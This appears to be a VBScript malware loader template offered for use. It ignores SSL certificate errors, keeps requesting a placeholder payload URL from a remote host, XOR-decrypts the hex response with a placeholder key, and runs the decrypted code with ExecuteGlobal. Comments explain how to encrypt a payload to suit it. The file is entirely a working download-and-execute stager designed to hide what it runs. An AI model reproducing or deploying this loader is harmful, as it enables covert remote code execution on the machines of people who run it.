On Error Resume Next:
Set a=CreateObject("MSXML2.ServerXMLHTTP.6.0"):
	a.setOption 2,13056:
while(Len(b) = 0):
	a.open"GET","YOUR_VBS_PAYLOAD_LINK",False:
	a.send:
	
	b = a.responseText:
wend:
k="DECRYPT_KEY":
for i = 0 to Len(b) - 1 Step 2:
	c = c & Chr(Asc(Chr("&H" & Mid(b, i + 1, 2))) xor Asc(Mid(k, ((i / 2)mod Len(k)) + 1, 1))):
	' You can encrypt your payload as like
	' x = strPayload, y = strKey, z = strEncryptedHexPayload
	'
	' (Pseudo code)
	' z = (x XOR y)
	' z => to hexadecimal
Next:
ExecuteGlobal c:
